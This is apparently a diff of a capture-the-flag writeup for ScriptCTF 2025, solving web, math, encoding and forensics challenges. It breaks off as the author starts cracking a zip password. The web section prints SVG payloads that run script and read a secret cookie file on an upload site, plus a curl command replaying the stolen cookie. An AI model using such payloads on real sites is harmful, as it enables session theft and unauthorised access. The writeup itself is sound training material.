@@ -10,9 +10,7 @@ tags = ["ctf", "rev", "web", "forensics"]
 # ScriptCTF 2025 – Challenge Writeup
 
 ![][image1]  
-Over the weekend, I participated in **ScriptCTF**, a capture-the-flag competition packed with diverse challenges spanning cryptography, forensics, reverse engineering, and web exploitation. 
-
-Our team managed position \_\_\_\_\_\_ out of \_\_\_ teams with non zero points.
+Over the weekend, I participated in ScriptCTF, a capture-the-flag competition packed with diverse challenges spanning cryptography, forensics, reverse engineering, and web exploitation. 
 
 In this write-up, I’ll walk through some of the problems I solved, breaking down my approach, the tools I used, and the reasoning behind each step. Rather than just dropping final answers, my goal is to document the problem-solving process in a way that’s reproducible and useful for others looking to sharpen their cybersecurity skills. 
 
@@ -23,97 +21,97 @@ In this write-up, I’ll walk through some of the problems I solved, breaking do
 This is the first web challenge; it launches an instance, and the source code is provided for manual code review. There are three important files: two Jinja templates and a Python file. 
 
 upload.html  
-\`\`\`html  
-\<\!DOCTYPE html\>  
-\<html\>  
-\<head\>  
-    \<title\>Upload Image\</title\>  
-\</head\>  
-\<body\>  
-    \<h1\>Upload Images\</h1\>  
-    \<p\>This free to use website allows you to render your images\!\<p\>  
-    \<form method="post" enctype="multipart/form-data"\>  
-        \<input type="file" name="file" accept=".png,.jpg,.jpeg,.svg" required\>  
-        \<input type="submit" value="Upload"\>  
-    \</form\>  
-\</body\>  
-\</html\>  
-\`\`\`  
+```html  
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>Upload Image</title>  
+</head>  
+<body>  
+    <h1>Upload Images</h1>  
+    <p>This free to use website allows you to render your images!<p>  
+    <form method="post" enctype="multipart/form-data">  
+        <input type="file" name="file" accept=".png,.jpg,.jpeg,.svg" required>  
+        <input type="submit" value="Upload">  
+    </form>  
+</body>  
+</html>  
+```  
 display.html  
-\`\`\`html  
-\<\!DOCTYPE html\>  
-\<html\>  
-\<head\>  
-    \<title\>View Image\</title\>  
-\<style\>  
+```html  
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>View Image</title>  
+<style>  
     iframe {  
         max-width: 600px;   
         max-height: 600px;   
         border: hidden;   
         overflow: none  
     }  
-\</style\>  
-\</head\>  
-\<body\>  
-    \<h1\>Uploaded Image\</h1\>  
-    \<iframe src="{{'/static/uploads/' \+ filename }}" alt="Uploaded Image"\>\</iframe\>  
-    \<p\>\<a href="/"\>Upload another image\</a\>\</p\>  
-\</body\>  
-\</html\>  
-\`\`\`
+</style>  
+</head>  
+<body>  
+    <h1>Uploaded Image</h1>  
+    <iframe src="{{'/static/uploads/' + filename }}" alt="Uploaded Image"></iframe>  
+    <p><a href="/">Upload another image</a></p>  
+</body>  
+</html>  
+```
 
-\`[app.py](http://app.py)\`
+`[app.py](http://app.py)`
 
-\`\`\`python  
-from flask import Flask, request, redirect, render\_template, make\_response, url\_for  
-app \= Flask(\_\_name\_\_)  
+```python  
+from flask import Flask, request, redirect, render_template, make_response, url_for  
+app = Flask(__name__)  
 from hashlib import sha256  
 import os  
 def allowed(name):  
-    if name.split('.')\[1\] in \['jpg','jpeg','png','svg'\]:  
+    if name.split('.')[1] in ['jpg','jpeg','png','svg']:  
         return True  
     return False
 
-@app.route('/',methods=\['GET','POST'\])  
+@app.route('/',methods=['GET','POST'])  
 def upload():  
-    if request.method \== 'POST':  
+    if request.method == 'POST':  
         if 'file' not in request.files:  
             return redirect(request.url)  
-        file \= request.files\['file'\]  
-        if file.filename \== '':  
+        file = request.files['file']  
+        if file.filename == '':  
             return redirect(request.url)  
         if file and allowed(file.filename):  
-            filename \= file.filename  
-            hash \= sha256(os.urandom(32)).hexdigest()  
-            filepath \= f'./static/uploads/{hash}.{filename.split(".")\[1\]}'  
+            filename = file.filename  
+            hash = sha256(os.urandom(32)).hexdigest()  
+            filepath = f'./static/uploads/{hash}.{filename.split(".")[1]}'  
             file.save(filepath)  
-            return redirect(f'/render/{hash}.{filename.split(".")\[1\]}')  
-    return render\_template('upload.html')
+            return redirect(f'/render/{hash}.{filename.split(".")[1]}')  
+    return render_template('upload.html')
 
-@app.route('/render/\<path:filename\>')  
+@app.route('/render/<path:filename>')  
 def render(filename):  
-    return render\_template('display.html', filename=filename)
+    return render_template('display.html', filename=filename)
 
 @app.route('/developer')  
 def developer():  
-    cookie \= request.cookies.get("developer\_secret\_cookie")  
-    correct \= open('./static/uploads/secrets/secret\_cookie.txt').read()  
-    if correct \== '':  
-        c \= open('./static/uploads/secrets/secret\_cookie.txt','w')  
+    cookie = request.cookies.get("developer_secret_cookie")  
+    correct = open('./static/uploads/secrets/secret_cookie.txt').read()  
+    if correct == '':  
+        c = open('./static/uploads/secrets/secret_cookie.txt','w')  
         c.write(sha256(os.urandom(16)).hexdigest())  
         c.close()  
-    correct \= open('./static/uploads/secrets/secret\_cookie.txt').read()  
-    if cookie \== correct:  
-        c \= open('./static/uploads/secrets/secret\_cookie.txt','w')  
+    correct = open('./static/uploads/secrets/secret_cookie.txt').read()  
+    if cookie == correct:  
+        c = open('./static/uploads/secrets/secret_cookie.txt','w')  
         c.write(sha256(os.urandom(16)).hexdigest())  
         c.close()  
-        return f"Welcome\! There is currently 1 unread message: {open('flag.txt').read()}"  
+        return f"Welcome! There is currently 1 unread message: {open('flag.txt').read()}"  
     else:  
-        return "You are not a developer\!"
+        return "You are not a developer!"
 
-if \_\_name\_\_ \== '\_\_main\_\_':  
+if __name__ == '__main__':  
     app.run(host='0.0.0.0', port=1337)  
-\`\`\`
+```
 
 From the files, we can see that this is an app built using Flask. What the app does:
 
@@ -139,12 +137,12 @@ Key Observations
 
 1. File upload: Only the extension is checked; there is no content verification. So you can upload anything with .jpg, .png, etc.
 
-2. Render template: The render() route calls render\_template('display.html', filename=filename).
+2. Render template: The render() route calls render_template('display.html', filename=filename).
 
-3. Secrets: The /developer route requires knowing secret\_cookie.txt. We need a way to leak it.
+3. Secrets: The /developer route requires knowing secret_cookie.txt. We need a way to leak it.
 
 Navigating to the developer endpoint without the cookie returns this request.  
-\`\`\`  
+```  
 HTTP/1.1 200 OK  
 Server: Werkzeug/3.1.3 Python/3.10.16  
 Date: Sun, 17 Aug 2025 11:51:49 GMT  
@@ -152,37 +150,37 @@ Content-Type: text/html; charset=utf-8
 Content-Length: 24  
 Connection: close
 
-You are not a developer\!  
-\`\`\`  
+You are not a developer!  
+```  
 Now I tried some path traversal techniques, but I couldn't reach the cookie. I turned my focus on how the uploaded images were being rendered and saw that it was an inline iframe. Hmm… interesting, what if I could get code execution on this? I thought of uploading a malicious SVG.  
 Here is an innocent-looking SVG
 
-\`\`\`  
-\<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"\>  
-  \<script type="text/javascript"\>  
+```svg  
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">  
+  <script type="text/javascript">  
     fetch('/developer', {credentials:'include'})  
-      .then(res \=\> res.text())  
-      .then(data \=\> alert(data));  
-  \</script\>  
-\</svg\>  
-\`\`\`
+      .then(res => res.text())  
+      .then(data => alert(data));  
+  </script>  
+</svg>  
+```
 
 And…  
 ![][image3]  
 I didn't think that through. I can't make that request without the cookie. Another approach I tried was Local File Inclusion(LFI) using the SVG. Here is another not-so-evil one:
 
-\`\`\`  
-\<svg xmlns="http://www.w3.org/2000/svg"\>  
-  \<image href="/static/uploads/secrets/secret\_cookie.txt" /\>  
-\</svg\>  
-\`\`\`  
-The browser shows it as a broken image, but on opening it on another tab, I was able to leak the cookie \`5eb7b76fbb08895de572fbe6028a4ee4abe3663641416deb5b889e0127920c6e\`. I copied and pasted the direct URL on another browser tab, and I got straight to it. I might have over-engineered something so simple, but anyway, Do Hard Things\!\!  
+```svg  
+<svg xmlns="http://www.w3.org/2000/svg">  
+  <image href="/static/uploads/secrets/secret_cookie.txt" />  
+</svg>  
+```  
+The browser shows it as a broken image, but on opening it on another tab, I was able to leak the cookie `5eb7b76fbb08895de572fbe6028a4ee4abe3663641416deb5b889e0127920c6e`. I copied and pasted the direct URL on another browser tab, and I got straight to it. I might have over-engineered something so simple, but anyway, Do Hard Things!!  
 Retrieving the flag  
-\`\`\`  
-$ curl \-b "developer\_secret\_cookie=5eb7b76fbb08895de572fbe6028a4ee4abe3663641416deb5b889e0127920c6e" http://play.scriptsorcerers.xyz:10257/developer
+```zsh  
+$ curl -b "developer_secret_cookie=5eb7b76fbb08895de572fbe6028a4ee4abe3663641416deb5b889e0127920c6e" http://play.scriptsorcerers.xyz:10257/developer
 
-Welcome\! There is currently 1 unread message: scriptCTF{my\_c00k135\_4r3\_n0t\_s4f3\!\_601871f7aad5}  
-\`\`\`
+Welcome! There is currently 1 unread message: scriptCTF{my_c00k135_4r3_n0t_s4f3!_601871f7aad5}  
+```
 
 Flag: `scriptCTF{my_c00k135_4r3_n0t_s4f3!_601871f7aad5}`
 
@@ -190,34 +188,34 @@ Flag: `scriptCTF{my_c00k135_4r3_n0t_s4f3!_601871f7aad5}`
 
 ![][image4]  
 Here are the contents of the [chall.py](http://chall.py)  
-\`\`\`  
+```python  
 import os  
 import decimal  
-decimal.getcontext().prec \= 50
+decimal.getcontext().prec = 50
 
-secret \= int(os.urandom(16).hex(),16)  
-num \= input('Enter a number: ')
+secret = int(os.urandom(16).hex(),16)  
+num = input('Enter a number: ')
 
 if 'e' in num.lower():  
    print("Nice try...")  
    exit(0)
 
-if len(num) \>= 10:  
+if len(num) >= 10:  
    print('Number too long...')  
    exit(0)
 
-fl\_num \= decimal.Decimal(num)  
-div \= secret / fl\_num
+fl_num = decimal.Decimal(num)  
+div = secret / fl_num
 
-if div \== 0:  
+if div == 0:  
    print(open('flag.txt').read().strip())  
 else:  
    print('Try again...')     
-\`\`\`
+```
 
 Let’s break it down:
 
-1. The server picks a **secret** — a random 128-bit integer (`os.urandom(16)` → 32 hex chars → huge number).
+1. The server picks a secret — a random 128-bit integer (`os.urandom(16)` → 32 hex chars → huge number).
 
 2. You input a number `num`.
 
@@ -225,25 +223,25 @@ Let’s break it down:
 
 4. If your input is ≥ 10 characters, you get blocked.
 
-5. It converts `num` to a `decimal.Decimal` with precision 50\.
+5. It converts `num` to a `decimal.Decimal` with precision 50.
 
 6. It computes `div = secret / fl_num`.
 
 7. If `div == 0`, you get the flag.
 
-**Key observation**
+Key observation
 
-* `secret` is positive and huge (on the order of `2**128`).
+* `secret` is positive and huge (on the order of `2128`).
 
-* Normally, `secret / something` won’t be 0\.
+* Normally, `secret / something` won’t be 0.
 
-* In Python `decimal.Decimal`, `div == 0` **only if** the result is *exactly* 0\. Decimal doesn’t overflow or underflow like float — it has arbitrary precision (set to 50).
+* In Python `decimal.Decimal`, `div == 0` only if the result is *exactly* 0. Decimal doesn’t overflow or underflow like float — it has arbitrary precision (set to 50).
 
 So how do we get exactly zero?
 
 * Decimal division only returns `0` if the numerator is `0` OR if the denominator is so huge that the quotient rounds down to 0 at the given precision.
 
-* Precision is **50 significant digits**. That means if the result is smaller than `10^(-50)`, it will round to 0\.
+* Precision is 50 significant digits. That means if the result is smaller than `10^(-50)`, it will round to 0.
 
 We want 
 
@@ -257,23 +255,23 @@ Since
 
 we need 
 
-\`fl\_num \> (3.4 × 10^38) × 10^50 \= 3.4 × 10^88\`
+`fl_num > (3.4 × 10^38) × 10^50 = 3.4 × 10^88`
 
 But there’s a catch  
-We can’t use exponent notation (e), and the input length must be \< 10 characters.
+We can’t use exponent notation (e), and the input length must be < 10 characters.
 
 That means we can’t type a literal 100000... with 89 zeros, it’s too long.  
 But in Decimal, you can input a decimal point and make something big by making it a very small number and dividing 1 by it.
 
-This is about **NaN / Infinity** in `decimal.Decimal`. If `fl_num` is `'Infinity'` (allowed, length 8), `secret / Infinity` 
+This is about NaN / Infinity in `decimal.Decimal`. If `fl_num` is `'Infinity'` (allowed, length 8), `secret / Infinity` 
 
-\`\`\`  
+```zsh  
 nc play.scriptsorcerers.xyz 10456
 
 Enter a number: Infinity  
-scriptCTF{70\_1nf1n17y\_4nd\_b3y0nd\_20e422d293fc}  
-\`\`\`  
-Flag: \`scriptCTF{70\_1nf1n17y\_4nd\_b3y0nd\_20e422d293fc}\`
+scriptCTF{70_1nf1n17y_4nd_b3y0nd_20e422d293fc}  
+```  
+Flag: `scriptCTF{70_1nf1n17y_4nd_b3y0nd_20e422d293fc}`
 
 Some context  
 Python’s decimal.Decimal module implements IEEE 754 decimal floating-point arithmetic.  
@@ -289,9 +287,9 @@ These are special constants, not parsed as normal numbers.
 
 Under IEEE 754 rules:
 
-- finite\_number / Infinity \= 0 exactly
+- finite_number / Infinity = 0 exactly
 
-- finite\_number / \-Infinity \= \-0 (also treated as zero)
+- finite_number / -Infinity = -0 (also treated as zero)
 
 Infinity represents a number so large that any finite numerator divided by it tends towards 0 exactly, with no rounding error.
 
@@ -299,112 +297,112 @@ Infinity represents a number so large that any finite numerator divided by it te
 
 ![][image5]  
 Out.txt has some symbols.  
-\`\`\`  
+```txt  
 🁳🁣🁲🁩🁰🁴🁃🁔🁆🁻🀳🁭🀰🁪🀱🁟🀳🁮🁣🀰🁤🀱🁮🁧🁟🀱🁳🁟🁷🀳🀱🁲🁤🁟🀴🁮🁤🁟🁦🁵🁮🀡🀱🁥🀴🀶🁤🁽  
-\`\`\`  
+```  
 The symbols are Unicode Domino Tiles (in the U+1F030–U+1F093 range). If you subtract 0x1F000 (the start of the Mahjong/Domino emoji area) from each character’s code point, you get plain ASCII bytes. You can learn more about Unicode here. 
 
 - [https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/](https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/)  
-- [https://en.wikipedia.org/wiki/Dominoes\#Dominoes\_in\_Unicode:\~:text=%5B38%5D-,Dominoes%20in%20Unicode,-%5Bedit%5D](https://en.wikipedia.org/wiki/Dominoes#Dominoes_in_Unicode:~:text=%5B38%5D-,Dominoes%20in%20Unicode,-%5Bedit%5D)  
+- [https://en.wikipedia.org/wiki/Dominoes#Dominoes_in_Unicode:~:text=%5B38%5D-,Dominoes%20in%20Unicode,-%5Bedit%5D](https://en.wikipedia.org/wiki/Dominoes#Dominoes_in_Unicode:~:text=%5B38%5D-,Dominoes%20in%20Unicode,-%5Bedit%5D)  
 - https://www.reedbeta.com/blog/programmers-intro-to-unicode/
 
 
   
 Here is a Python script for that(old habits die hard)  
-\`\`\`  
-s \= "🁳🁣🁲🁩🁰🁴🁃🁔🁆🁻🀳🁭🀰🁪🀱🁟🀳🁮🁣🀰🁤🀱🁮🁧🁟🀱🁳🁟🁷🀳🀱🁲🁤🁟🀴🁮🁤🁟🁦🁵🁮🀡🀱🁥🀴🀶🁤🁽"  
-print(''.join(chr(ord(ch) \- 0x1F000) for ch in s))  
-\`\`\`
+```python
+s = "🁳🁣🁲🁩🁰🁴🁃🁔🁆🁻🀳🁭🀰🁪🀱🁟🀳🁮🁣🀰🁤🀱🁮🁧🁟🀱🁳🁟🁷🀳🀱🁲🁤🁟🀴🁮🁤🁟🁦🁵🁮🀡🀱🁥🀴🀶🁤🁽"  
+print(''.join(chr(ord(ch) - 0x1F000) for ch in s))  
+```
 
-\`\`\`  
-$ python3 **solve.py**    
-scriptCTF{3m0j1\_3nc0d1ng\_1s\_w31rd\_4nd\_fun\!1e46d}  
-\`\`\`  
+```zsh  
+$ python3 solve.py    
+scriptCTF{3m0j1_3nc0d1ng_1s_w31rd_4nd_fun!1e46d}  
+```  
 Flag : `scriptCTF{3m0j1_3nc0d1ng_1s_w31rd_4nd_fun!1e46d}`
 
 # Challenge: Enchant
 
 ![][image6]  
-After some Google search, I found out that’s the **Standard Galactic Alphabet**, the glyphs used by Minecraft’s enchantment table. The enchantment-table glyphs map one-to-one to letters in the Standard Galactic Alphabet (SGA). I used the SGA ↔ Latin mapping to translate each symbol into its English letter at [https://www.dcode.fr/standard-galactic-alphabet](https://www.dcode.fr/standard-galactic-alphabet). The result is MINECRAFTISFUN.
+After some Google search, I found out that’s the Standard Galactic Alphabet, the glyphs used by Minecraft’s enchantment table. The enchantment-table glyphs map one-to-one to letters in the Standard Galactic Alphabet (SGA). I used the SGA ↔ Latin mapping to translate each symbol into its English letter at [https://www.dcode.fr/standard-galactic-alphabet](https://www.dcode.fr/standard-galactic-alphabet). The result is MINECRAFTISFUN.
 
-Flag: scriptCTF{MINECRAFTISFUN}
+Flag: `scriptCTF{MINECRAFTISFUN}`
 
 Challenge: diskchal  
 ![][image7]  
 This was a forensics challenge; we were given a disk image, probably to recover some files, as the challenge description suggests. 
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ file **stick.img**         
-stick.img: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "mkfs.fat", sectors 49152 (volumes \<=32 MB), Media descriptor 0xf8, sectors/track 32, heads 4, FAT (32 bit), sectors/FAT 378, reserved 0x1, serial num  
+```zsh
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ file stick.img         
+stick.img: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "mkfs.fat", sectors 49152 (volumes <=32 MB), Media descriptor 0xf8, sectors/track 32, heads 4, FAT (32 bit), sectors/FAT 378, reserved 0x1, serial num  
 ber 0x8caae860, unlabeled  
-\`\`\`
+```
 
 The file is a FAT32 filesystem image created with `mkfs.fat`.I try to mount the image and see what's inside.
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ sudo mount **stick.img** **mnt/**  
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ sudo mount stick.img mnt/  
                                                                                                                                                                                                                    
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ ls **mnt**                      
-**notes.txt**  **random\_thoughts.txt**  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ ls mnt                      
+notes.txt  random_thoughts.txt  
                                                                                                                                                                                                                    
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ cat **\*** **mnt/**     
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ cat * mnt/     
 cat: mnt: Is a directory  
-�X�mkfs.fat �� z�)\`誌NO NAME    FAT32   �w|�"�t  
+�X�mkfs.fat �� z�)`誌NO NAME    FAT32   �w|�"�t  
                                               V^2�����This is not a bootable disk.  Please insert a bootable floppy and  
 press any key to try again ...    
-U�RRaArrAa��U��X�mkfs.fat �� z�)\`誌NO NAME    FAT32   �w|�"�t  
+U�RRaArrAa��U��X�mkfs.fat �� z�)`誌NO NAME    FAT32   �w|�"�t  
                                                             V���^��2�����This is not a bootable disk.  Please insert a bootable floppy and  
 press any key to try again ...    
-U�RRaArrAa��U�������������������������������Anotes�.txt������NOTES   TXT Rk��Z\[k��ZLBts.tx\<t������������rando\<m\_thoughRANDOM\~1TXT Rk��Z\[k��Z8�collection.gz�secret\_magic\_�ECRET\~1GZ  Sk��Z�Zk��Z\<Notes:  
-\- practice my zarrow shuffle  
-\- learn some false cuts  
-\- play some sts  
+U�RRaArrAa��U�������������������������������Anotes�.txt������NOTES   TXT Rk��Z[k��ZLBts.tx<t������������rando<m_thoughRANDOM~1TXT Rk��Z[k��Z8�collection.gz�secret_magic_�ECRET~1GZ  Sk��Z�Zk��Z<Notes:  
+- practice my zarrow shuffle  
+- learn some false cuts  
+- play some sts  
 i wonder where i put the flag. did i palm it somewhere?  
 �xyhflag.txt+N.�,(qq�6��1(3��513L�7/2L�6��  
                                          ���cat: mnt/: Is a directory  
                                                                                                                                                                                                                    
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ cat **\***.txt  **mnt/**  
-cat: '\*.txt': No such file or directory  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ cat *.txt  mnt/  
+cat: '*.txt': No such file or directory  
 cat: mnt/: Is a directory  
                                                                                                                                                                                                                    
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ cd **mnt**            
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ cd mnt            
                                                                                                                                                                                                                    
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal/mnt**$ ls \-lah  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal/mnt$ ls -lah  
 total 5.5K  
-drwxr-xr-x 2 root           root            512 Jan  1  1970 **.**  
-drwxrwxr-x 3 mockingspectre mockingspectre 4.0K Aug 17 16:06 **..**  
-\-rwxr-xr-x 1 root           root             76 Jul 18 01:27 **notes.txt**  
-\-rwxr-xr-x 1 root           root             56 Jul 18 01:27 **random\_thoughts.txt**  
-\`\`\`
+drwxr-xr-x 2 root           root            512 Jan  1  1970 .  
+drwxrwxr-x 3 mockingspectre mockingspectre 4.0K Aug 17 16:06 ..  
+-rwxr-xr-x 1 root           root             76 Jul 18 01:27 notes.txt  
+-rwxr-xr-x 1 root           root             56 Jul 18 01:27 random_thoughts.txt  
+```
 
 Nothing particularly juicy or interesting. Running binwalk brings up some info.  
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ binwalk **stick.img**                                                                          
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ binwalk stick.img                                                                          
 
 DECIMAL       HEXADECIMAL     DESCRIPTION  
-\--------------------------------------------------------------------------------  
+--------------------------------------------------------------------------------  
 404992        0x62E00         gzip compressed data, has original file name: "flag.txt", from Unix, last modified: 2025-07-17 22:27:22  
-\`\`\`
+```
 
 Let me extract everything with `dd.`
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal**$ binwalk \--dd='.\*' **stick.img**
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal$ binwalk --dd='.*' stick.img
 
 DECIMAL       HEXADECIMAL     DESCRIPTION  
-\--------------------------------------------------------------------------------  
+--------------------------------------------------------------------------------  
 404992        0x62E00         gzip compressed data, has original file name: "flag.txt", from Unix, last modified: 2025-07-17 22:27:22  
-\`\`\`
+```
 
 After some bashfu, the flag is revealed.  
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal/\_stick.img.extracted**$ ls                        
-flag.txt  **flag.txt.gz**  
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal/_stick.img.extracted$ ls                        
+flag.txt  flag.txt.gz  
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/diskchal/\_stick.img.extracted**$ cat **flag.txt**              
-scriptCTF{1\_l0v3\_m461c\_7r1ck5}  
-\`\`\`  
-Flag: scriptCTF{1\_l0v3\_m461c\_7r1ck5}
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/diskchal/_stick.img.extracted$ cat flag.txt              
+scriptCTF{1_l0v3_m461c_7r1ck5}  
+```  
+Flag: scriptCTF{1_l0v3_m461c_7r1ck5}
 
 # Challenge: pdf
 
@@ -413,42 +411,42 @@ Opening the PDF was just a trol
 ![][image9]  
 Running strings on it made me think I had a quick win.
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/pdf**$ strings  **challenge.pdf** **|** grep \-i ctf  
-script**CTF**{this\_is\_def\_the\_flag\_trust}  
-\`\`\`  
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/pdf$ strings  challenge.pdf | grep -i ctf  
+scriptCTF{this_is_def_the_flag_trust}  
+```  
 Hmm.. quite easy. Or is it? Turns out this was the site-wide fake flag. Let's continue.
 
 Running binwalk gives us.
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/pdf**$ binwalk **challenge.pdf**       
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/pdf$ binwalk challenge.pdf       
 
 DECIMAL       HEXADECIMAL     DESCRIPTION  
-\--------------------------------------------------------------------------------  
+--------------------------------------------------------------------------------  
 0             0x0             PDF document, version: "1.4"  
 283           0x11B           Zlib compressed data, default compression  
 1521          0x5F1           Copyright string: "copyright/ordfeminine 172/logicalnot/.notdef/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu 183/periodcen"  
-\`\`\`  
+```  
 binwalk found a zlib chunk at offset 0x11B (decimal 283). Extracting
 
-\`\`\`  
-binwalk \-eM challenge.pdf  
-ls \-la \_challenge.pdf.extracted  
-\`\`\`
+```zsh  
+binwalk -eM challenge.pdf  
+ls -la _challenge.pdf.extracted  
+```
 
 We get the flag  
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/pdf/\_challenge.pdf.extracted**$ file **\***    
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/pdf/_challenge.pdf.extracted$ file *    
 11B:      ASCII text, with no line terminators  
 11B.zlib: zlib compressed data  
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/pdf/\_challenge.pdf.extracted**$ cat **11B**  
-scriptCTF{pdf\_s7r34m5\_0v3r\_7w17ch\_5tr34ms}                                 
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/pdf/_challenge.pdf.extracted$ cat 11B  
+scriptCTF{pdf_s7r34m5_0v3r_7w17ch_5tr34ms}                                 
 
-\`\`\`
+```
 
-Flag: \`scriptCTF{pdf\_s7r34m5\_0v3r\_7w17ch\_5tr34ms}\`
+Flag: `scriptCTF{pdf_s7r34m5_0v3r_7w17ch_5tr34ms}`
 
 # Challenge: Just Some Avocado
 
@@ -456,13 +454,13 @@ Flag: \`scriptCTF{pdf\_s7r34m5\_0v3r\_7w17ch\_5tr34ms}\`
 
 This is another forensics challenge; we are given a JPEG file with an image of an avocado. Preliminary investigations reveal some interesting objects.
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado**$ file **avocado.jpg**    
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ file avocado.jpg    
 avocado.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1280x1280, components 3  
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado**$ strings \-4 **avocado.jpg** **|** grep \-i script  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ strings -4 avocado.jpg | grep -i script  
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado**$ exiftool **avocado.jpg**                 
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ exiftool avocado.jpg                 
 ExifTool Version Number         : 13.25  
 File Name                       : avocado.jpg  
 Directory                       : .  
@@ -470,7 +468,7 @@ File Size                       : 509 kB
 File Modification Date/Time     : 2025:08:14 03:40:32+03:00  
 File Access Date/Time           : 2025:08:16 17:15:16+03:00  
 File Inode Change Date/Time     : 2025:08:16 17:15:11+03:00  
-File Permissions                : \-rw-rw-r--  
+File Permissions                : -rw-rw-r--  
 File Type                       : JPEG  
 File Type Extension             : jpg  
 MIME Type                       : image/jpeg  
@@ -483,72 +481,72 @@ Image Height                    : 1280
 Encoding Process                : Baseline DCT, Huffman coding  
 Bits Per Sample                 : 8  
 Color Components                : 3  
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2\)  
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)  
 Image Size                      : 1280x1280  
 Megapixels                      : 1.6  
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado**$ binwalk **avocado.jpg**                     
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ binwalk avocado.jpg                     
 
 DECIMAL       HEXADECIMAL     DESCRIPTION  
-\--------------------------------------------------------------------------------  
+--------------------------------------------------------------------------------  
 0             0x0             JPEG image data, JFIF standard 1.01  
 100599        0x188F7         Zip archive data, encrypted at least v1.0 to extract, compressed size: 234, uncompressed size: 222, name: justsomezip.zip  
 100922        0x18A3A         Zip archive data, encrypted at least v2.0 to extract, compressed size: 408140, uncompressed size: 437908, name: staticnoise.wav  
 509321        0x7C589         End of Zip archive, footer length: 22  
-\`\`\`
+```
 
-Embedded within the image are two files, a zip file \`justsomezip.zip\` and a wav audio file staticnoise.wav . Extracting the files
+Embedded within the image are two files, a zip file `justsomezip.zip` and a wav audio file staticnoise.wav . Extracting the files
 
-\`\`\`  
-mockingspectre@kali:\~/ctf/scriptctf2025/forensics/justsome-avocado$ dd if=avocado.jpg of=justsomezip.zip bs=1 skip=100599
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ dd if=avocado.jpg of=justsomezip.zip bs=1 skip=100599
 
 408744+0 records in  
 408744+0 records out  
 408744 bytes (409 kB, 399 KiB) copied, 0.713391 s, 573 kB/s  
                                                                                                                                                                                                                  
-mockingspectre@kali:\~/ctf/scriptctf2025/forensics/justsome-avocado$ dd if=avocado.jpg of=staticnoise.wav  bs=1 skip=100922
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ dd if=avocado.jpg of=staticnoise.wav  bs=1 skip=100922
 
 408421+0 records in  
 408421+0 records out  
 408421 bytes (408 kB, 399 KiB) copied, 0.725639 s, 563 kB/s  
                                                                                                                                                                                                                  
-mockingspectre@kali:\~/ctf/scriptctf2025/forensics/justsome-avocado$ ls  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ ls  
 avocado.jpg  justsomezip.zip  staticnoise.wav  
-\`\`\`  
+```  
 The zip file is password-protected. I'll try using John to crack it.
